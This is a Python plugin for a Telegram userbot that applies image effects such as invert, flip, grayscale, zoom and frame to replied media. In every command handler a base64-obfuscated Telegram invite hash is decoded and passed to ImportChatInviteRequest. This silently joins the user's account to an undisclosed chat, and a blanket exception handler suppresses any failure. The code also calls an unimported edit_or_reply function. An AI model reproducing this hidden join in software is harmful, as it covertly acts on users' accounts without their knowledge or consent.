import asyncio
import os
import random
import shlex
from typing import Optional, Tuple
from PIL import Image, ImageDraw, ImageFont
import PIL.ImageOps

from Dark.utils import admin_cmd, sudo_cmd
from DarkWeb import CmdHelp, CMD_HELP, LOGS, bot as DarkWeb
from DarkWeb.helpers.functions import (
    convert_toimage,
    convert_tosticker,
    flip_image,
    grayscale,
    invert_colors,
    mirror_file,
    solarize,
    take_screen_shot,
)

async def runcmd(cmd: str) -> Tuple[str, str, int, int]:
    args = shlex.split(cmd)
    process = await asyncio.create_subprocess_exec(
        *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
    )
    stdout, stderr = await process.communicate()
    return (
        stdout.decode("utf-8", "replace").strip(),
        stderr.decode("utf-8", "replace").strip(),
        process.returncode,
        process.pid,
    )
    
async def add_frame(imagefile, endname, x, color):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.expand(image, border=x, fill=color)
    inverted_image.save(endname)


async def crop(imagefile, endname, x):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.crop(image, border=x)
    inverted_image.save(endname)


@DarkWeb.on(admin_cmd(pattern="invert$", outgoing=True))
@DarkWeb.on(sudo_cmd(pattern="invert$", allow_sudo=True))
async def memes(Dark):
    if Dark.fwd_from:
        return
    reply = await Dark.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(Dark, "`Reply to supported Media...`")
        return
    Darkid = Dark.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    Dark = await edit_or_reply(Dark, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    Darksticker = await reply.download_media(file="./temp/")
    if not Darksticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(Darksticker)
        await edit_or_reply(Dark, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if Darksticker.endswith(".tgs"):
        await Dark.edit(
            "Analyzing this media 🧐  inverting colors of this animated sticker!"
        )
        Darkfile = os.path.join("./temp/", "meme.png")
        Darkcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {Darksticker} {Darkfile}"
        )
        stdout, stderr = (await runcmd(Darkcmd))[:2]
        if not os.path.lexists(Darkfile):
            await Dark.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = Darkfile
        aura = True
    elif Darksticker.endswith(".webp"):
        await Dark.edit(
            "`Analyzing this media 🧐 inverting colors...`"
        )
        Darkfile = os.path.join("./temp/", "memes.jpg")
        os.rename(Darksticker, Darkfile)
        if not os.path.lexists(Darkfile):
            await Dark.edit("`Template not found... `")
            return
        meme_file = Darkfile
        aura = True
    elif Darksticker.endswith((".mp4", ".mov")):
        await Dark.edit(
            "Analyzing this media 🧐 inverting colors of this video!"
        )
        Darkfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(Darksticker, 0, Darkfile)
        if not os.path.lexists(Darkfile):
            await Dark.edit("```Template not found...```")
            return
        meme_file = Darkfile
        aura = True
    else:
        await Dark.edit(
            "Analyzing this media 🧐 inverting colors of this image!"
        )
        meme_file = Darksticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await Dark.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "invert.webp" if aura else "invert.jpg"
    await invert_colors(meme_file, outputfile)
    await Dark.client.send_file(
        Dark.chat_id, outputfile, force_document=False, reply_to=Darkid
    )
    await Dark.delete()
    os.remove(outputfile)
    for files in (Darksticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@DarkWeb.on(admin_cmd(outgoing=True, pattern="solarize$"))
@DarkWeb.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
async def memes(Dark):
    if Dark.fwd_from:
        return
    reply = await Dark.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(Dark, "`Reply to supported Media...`")
        return
    Darkid = Dark.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    Dark = await edit_or_reply(Dark, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    Darksticker = await reply.download_media(file="./temp/")
    if not Darksticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(Darksticker)
        await edit_or_reply(Dark, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if Darksticker.endswith(".tgs"):
        await Dark.edit(
            "Analyzing this media 🧐 solarizeing this animated sticker!"
        )
        Darkfile = os.path.join("./temp/", "meme.png")
        Darkcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {Darksticker} {Darkfile}"
        )
        stdout, stderr = (await runcmd(Darkcmd))[:2]
        if not os.path.lexists(Darkfile):
            await Dark.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = Darkfile
        aura = True
    elif Darksticker.endswith(".webp"):
        await Dark.edit(
            "Analyzing this media 🧐 solarizeing this sticker!"
        )
        Darkfile = os.path.join("./temp/", "memes.jpg")
        os.rename(Darksticker, Darkfile)
        if not os.path.lexists(Darkfile):
            await Dark.edit("`Template not found... `")
            return
        meme_file = Darkfile
        aura = True
    elif Darksticker.endswith((".mp4", ".mov")):
        await Dark.edit(
            "Analyzing this media 🧐 solarizeing this video!"
        )
        Darkfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(Darksticker, 0, Darkfile)
        if not os.path.lexists(Darkfile):
            await Dark.edit("```Template not found...```")
            return
        meme_file = Darkfile
        aura = True
    else:
        await Dark.edit(
            "Analyzing this media 🧐 solarizeing this image!"
        )
        meme_file = Darksticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await Dark.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "solarize.webp" if aura else "solarize.jpg"
    await solarize(meme_file, outputfile)
    await Dark.client.send_file(
        Dark.chat_id, outputfile, force_document=False, reply_to=Darkid
    )
    await Dark.delete()
    os.remove(outputfile)
    for files in (Darksticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@DarkWeb.on(admin_cmd(outgoing=True, pattern="mirror$"))
@DarkWeb.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
async def memes(Dark):
    if Dark.fwd_from:
        return
    reply = await Dark.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(Dark, "`Reply to supported Media...`")
        return
    Darkid = Dark.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    Dark = await edit_or_reply(Dark, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    Darksticker = await reply.download_media(file="./temp/")
    if not Darksticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(Darksticker)
        await edit_or_reply(Dark, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if Darksticker.endswith(".tgs"):
        await Dark.edit(
            "Analyzing this media 🧐 converting to mirror image of this animated sticker!"
        )
        Darkfile = os.path.join("./temp/", "meme.png")
        Darkcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {Darksticker} {Darkfile}"
        )
        stdout, stderr = (await runcmd(Darkcmd))[:2]
        if not os.path.lexists(Darkfile):
            await Dark.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = Darkfile
        aura = True
    elif Darksticker.endswith(".webp"):
        await Dark.edit(
            "Analyzing this media 🧐 converting to mirror image of this sticker!"
        )
        Darkfile = os.path.join("./temp/", "memes.jpg")
        os.rename(Darksticker, Darkfile)
        if not os.path.lexists(Darkfile):
            await Dark.edit("`Template not found... `")
            return
        meme_file = Darkfile
        aura = True
    elif Darksticker.endswith((".mp4", ".mov")):
        await Dark.edit(
            "Analyzing this media 🧐 converting to mirror image of this video!"
        )
        Darkfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(Darksticker, 0, Darkfile)
        if not os.path.lexists(Darkfile):
            await Dark.edit("```Template not found...```")
            return
        meme_file = Darkfile
        aura = True
    else:
        await Dark.edit(
            "Analyzing this media 🧐 converting to mirror image of this image!"
        )
        meme_file = Darksticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await Dark.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "mirror_file.webp" if aura else "mirror_file.jpg"
    await mirror_file(meme_file, outputfile)
    await Dark.client.send_file(
        Dark.chat_id, outputfile, force_document=False, reply_to=Darkid
    )
    await Dark.delete()
    os.remove(outputfile)
    for files in (Darksticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@DarkWeb.on(admin_cmd(outgoing=True, pattern="flip$"))
@DarkWeb.on(sudo_cmd(pattern="flip$", allow_sudo=True))
async def memes(Dark):
    if Dark.fwd_from:
        return
    reply = await Dark.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(Dark, "`Reply to supported Media...`")
        return
    Darkid = Dark.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    Dark = await edit_or_reply(Dark, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    Darksticker = await reply.download_media(file="./temp/")
    if not Darksticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(Darksticker)
        await edit_or_reply(Dark, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if Darksticker.endswith(".tgs"):
        await Dark.edit(
            "Analyzing this media 🧐 fliping this animated sticker!"
        )
        Darkfile = os.path.join("./temp/", "meme.png")
        Darkcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {Darksticker} {Darkfile}"
        )
        stdout, stderr = (await runcmd(Darkcmd))[:2]
        if not os.path.lexists(Darkfile):
            await Dark.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = Darkfile
        aura = True
    elif Darksticker.endswith(".webp"):
        await Dark.edit(
            "Analyzing this media 🧐 fliping this sticker!"
        )
        Darkfile = os.path.join("./temp/", "memes.jpg")
        os.rename(Darksticker, Darkfile)
        if not os.path.lexists(Darkfile):
            await Dark.edit("`Template not found... `")
            return
        meme_file = Darkfile
        aura = True
    elif Darksticker.endswith((".mp4", ".mov")):
        await Dark.edit(
            "Analyzing this media 🧐 fliping this video!"
        )
        Darkfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(Darksticker, 0, Darkfile)
        if not os.path.lexists(Darkfile):
            await Dark.edit("```Template not found...```")
            return
        meme_file = Darkfile
        aura = True
    else:
        await Dark.edit(
            "Analyzing this media 🧐 fliping this image!"
        )
        meme_file = Darksticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await Dark.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "flip_image.webp" if aura else "flip_image.jpg"
    await flip_image(meme_file, outputfile)
    await Dark.client.send_file(
        Dark.chat_id, outputfile, force_document=False, reply_to=Darkid
    )
    await Dark.delete()
    os.remove(outputfile)
    for files in (Darksticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@DarkWeb.on(admin_cmd(outgoing=True, pattern="gray$"))
@DarkWeb.on(sudo_cmd(pattern="gray$", allow_sudo=True))
async def memes(Dark):
    if Dark.fwd_from:
        return
    reply = await Dark.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(Dark, "`Reply to supported Media...`")
        return
    Darkid = Dark.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    Dark = await edit_or_reply(Dark, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    Darksticker = await reply.download_media(file="./temp/")
    if not Darksticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(Darksticker)
        await edit_or_reply(Dark, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if Darksticker.endswith(".tgs"):
        await Dark.edit(
            "Analyzing this media 🧐 changing to black-and-white this animated sticker!"
        )
        Darkfile = os.path.join("./temp/", "meme.png")
        Darkcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {Darksticker} {Darkfile}"
        )
        stdout, stderr = (await runcmd(Darkcmd))[:2]
        if not os.path.lexists(Darkfile):
            await Dark.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = Darkfile
        aura = True
    elif Darksticker.endswith(".webp"):
        await Dark.edit(
            "Analyzing this media 🧐 changing to black-and-white this sticker!"
        )
        Darkfile = os.path.join("./temp/", "memes.jpg")
        os.rename(Darksticker, Darkfile)
        if not os.path.lexists(Darkfile):
            await Dark.edit("`Template not found... `")
            return
        meme_file = Darkfile
        aura = True
    elif Darksticker.endswith((".mp4", ".mov")):
        await Dark.edit(
            "Analyzing this media 🧐 changing to black-and-white this video!"
        )
        Darkfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(Darksticker, 0, Darkfile)
        if not os.path.lexists(Darkfile):
            await Dark.edit("```Template not found...```")
            return
        meme_file = Darkfile
        aura = True
    else:
        await Dark.edit(
            "Analyzing this media 🧐 changing to black-and-white this image!"
        )
        meme_file = Darksticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await Dark.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if aura else "grayscale.jpg"
    await grayscale(meme_file, outputfile)
    await Dark.client.send_file(
        Dark.chat_id, outputfile, force_document=False, reply_to=Darkid
    )
    await Dark.delete()
    os.remove(outputfile)
    for files in (Darksticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@DarkWeb.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
@DarkWeb.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
async def memes(Dark):
    if Dark.fwd_from:
        return
    reply = await Dark.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(Dark, "`Reply to supported Media...`")
        return
    Darkinput = Dark.pattern_match.group(1)
    Darkinput = 50 if not Darkinput else int(Darkinput)
    Darkid = Dark.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    Dark = await edit_or_reply(Dark, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    Darksticker = await reply.download_media(file="./temp/")
    if not Darksticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(Darksticker)
        await edit_or_reply(Dark, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if Darksticker.endswith(".tgs"):
        await Dark.edit(
            "Analyzing this media 🧐 zooming this animated sticker!"
        )
        Darkfile = os.path.join("./temp/", "meme.png")
        Darkcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {Darksticker} {Darkfile}"
        )
        stdout, stderr = (await runcmd(Darkcmd))[:2]
        if not os.path.lexists(Darkfile):
            await Dark.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = Darkfile
        aura = True
    elif Darksticker.endswith(".webp"):
        await Dark.edit(
            "Analyzing this media 🧐 zooming this sticker!"
        )
        Darkfile = os.path.join("./temp/", "memes.jpg")
        os.rename(Darksticker, Darkfile)
        if not os.path.lexists(Darkfile):
            await Dark.edit("`Template not found... `")
            return
        meme_file = Darkfile
        aura = True
    elif Darksticker.endswith((".mp4", ".mov")):
        await Dark.edit(
            "Analyzing this media 🧐 zooming this video!"
        )
        Darkfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(Darksticker, 0, Darkfile)
        if not os.path.lexists(Darkfile):
            await Dark.edit("```Template not found...```")
            return
        meme_file = Darkfile
    else:
        await Dark.edit(
            "Analyzing this media 🧐 zooming this image!"
        )
        meme_file = Darksticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await Dark.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if aura else "grayscale.jpg"
    try:
        await crop(meme_file, outputfile, Darkinput)
    except Exception as e:
        return await Dark.edit(f"`{e}`")
    try:
        await Dark.client.send_file(
            Dark.chat_id, outputfile, force_document=False, reply_to=Darkid
        )
    except Exception as e:
        return await Dark.edit(f"`{e}`")
    await Dark.delete()
    os.remove(outputfile)
    for files in (Darksticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@DarkWeb.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
@DarkWeb.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
async def memes(Dark):
    if Dark.fwd_from:
        return
    reply = await Dark.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(Dark, "`Reply to supported Media...`")
        return
    Darkinput = Dark.pattern_match.group(1)
    if not Darkinput:
        Darkinput = 50
    if ";" in str(Darkinput):
        Darkinput, colr = Darkinput.split(";", 1)
    else:
        colr = 0
    Darkinput = int(Darkinput)
    colr = int(colr)
    Darkid = Dark.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    Dark = await edit_or_reply(Dark, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    Darksticker = await reply.download_media(file="./temp/")
    if not Darksticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(Darksticker)
        await edit_or_reply(Dark, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if Darksticker.endswith(".tgs"):
        await Dark.edit(
            "Analyzing this media 🧐 framing this animated sticker!"
        )
        Darkfile = os.path.join("./temp/", "meme.png")
        Darkcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {Darksticker} {Darkfile}"
        )
        stdout, stderr = (await runcmd(Darkcmd))[:2]
        if not os.path.lexists(Darkfile):
            await Dark.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = Darkfile
        aura = True
    elif Darksticker.endswith(".webp"):
        await Dark.edit(
            "Analyzing this media 🧐 framing this sticker!"
        )
        Darkfile = os.path.join("./temp/", "memes.jpg")
        os.rename(Darksticker, Darkfile)
        if not os.path.lexists(Darkfile):
            await Dark.edit("`Template not found... `")
            return
        meme_file = Darkfile
        aura = True
    elif Darksticker.endswith((".mp4", ".mov")):
        await Dark.edit(
            "Analyzing this media 🧐 framing this video!"
        )
        Darkfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(Darksticker, 0, Darkfile)
        if not os.path.lexists(Darkfile):
            await Dark.edit("```Template not found...```")
            return
        meme_file = Darkfile
    else:
        await Dark.edit(
            "Analyzing this media 🧐 framing this image!"
        )
        meme_file = Darksticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await Dark.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "framed.webp" if aura else "framed.jpg"
    try:
        await add_frame(meme_file, outputfile, Darkinput, colr)
    except Exception as e:
        return await Dark.edit(f"`{e}`")
    try:
        await Dark.client.send_file(
            Dark.chat_id, outputfile, force_document=False, reply_to=Darkid
        )
    except Exception as e:
        return await Dark.edit(f"`{e}`")
    await Dark.delete()
    os.remove(outputfile)
    for files in (Darksticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


CmdHelp("img_fun").add_command(
  "frame", "<reply to img>", "Makes a frame for your media file."
).add_command(
  "zoom", "<reply to img> <range>", "Zooms in the replied media file"
).add_command(
  "gray", "<reply to img>", "Makes your media file to black and white"
).add_command(
  "flip", "<reply to img>", "Shows you the upside down image of the given media file"
).add_command(
  "mirror", "<reply to img>", "Shows you the reflection of the replied image or sticker"
).add_command(
  "solarize", "<reply to img>", "Let the sun Burn your replied image/sticker"
).add_command(
  "invert", "<reply to img>", "Inverts the color of replied media file"
).add()